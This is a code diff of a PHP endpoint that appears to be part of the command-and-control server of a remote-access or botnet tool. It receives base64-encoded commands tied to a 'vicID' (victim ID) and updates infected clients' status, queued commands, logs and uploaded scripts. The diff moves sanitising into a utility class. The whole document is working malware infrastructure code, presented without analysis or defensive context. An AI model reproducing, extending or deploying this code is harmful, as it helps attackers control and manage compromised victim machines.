@@ -1,56 +1,50 @@
 <?php
 include_once 'classes/Database.php';
 include_once 'classes/Clients.php';
-$client = new Clients;
-$_GET = filter_input_array(INPUT_GET, FILTER_SANITIZE_STRING);
-$command = sanitizeInput(base64_decode($_GET['command']));
-$ID = "'".sanitizeInput(base64_decode($_GET['vicID']))."'";
-$data = $client->getClient(trim($ID,"'"));
+include_once 'classes/Utils.php';
 
-$A = explode("|BN|", sanitizeInput($command));
+$utils = new Utils;
+
+$client = new Clients;
+
+$command = $utils->sanitize(base64_decode($_GET['command']));
+$ID = $utils->sanitize(base64_decode($_GET['vicID']));
+$data = $client->getClient($ID);
+
+$A = explode("|BN|", $utils->sanitize($command));
 
 switch ($A[0]) {
 	case "Uninstall":
-          $client->removeClient($ID);
+		$client->removeClient($ID);
 		break;
 
 	case "CleanCommands":
-          $client->updateCommands($ID,base64_encode("Ping"));
+		$client->updateCommands($ID, base64_encode("Ping"));
 		break;
-		
+
 	case "Offline":
-          $client->updateStatus($ID,"Offline");
+		$client->updateStatus($ID, "Offline");
 		break;
 
 	case "Online":
-		  $client->updateStatus($ID,"Online");
+		$client->updateStatus($ID, "Online");
 		break;
-		
+
 	case 'Ping':
-		$client->updateCommands($ID,"Ping");
-		$client->pinged($ID,$data->pings);
+		$client->updateCommands($ID, "Ping");
+		$client->pinged($ID, $data->pings);
 		break;
 
 	case 'DeleteScript':
-		 try {
-		    unlink(realpath(sanitizeInput("scripts/" . trim($A[1], "./"))));
-		 } catch (Exception $e) {
-		 	
-		 }
+		try {
+			@unlink(realpath($utils->sanitize("scripts/" . trim($A[1], "./"))));
+		} catch (Exception $e) {
+			echo $e->getMessage();
+		}
 		break;
 	case "NewLog":
-		$client->new_log(trim($ID,"'"),$A[1],$A[2]);
+		$client->new_log($ID, $utils->sanitize($A[1]), $utils->sanitize($A[2]));
 		break;
 	default:
 		break;
 }
-
-function sanitizeInput($value){
-   $data = trim($value);
-   $data = strip_tags($data);
-   $data = htmlentities($data);
-   $data = htmlspecialchars($data,ENT_QUOTES,'UTF-8');
-   $data = filter_var($data,FILTER_SANITIZE_STRING);
-   return $data;
-}
-?>
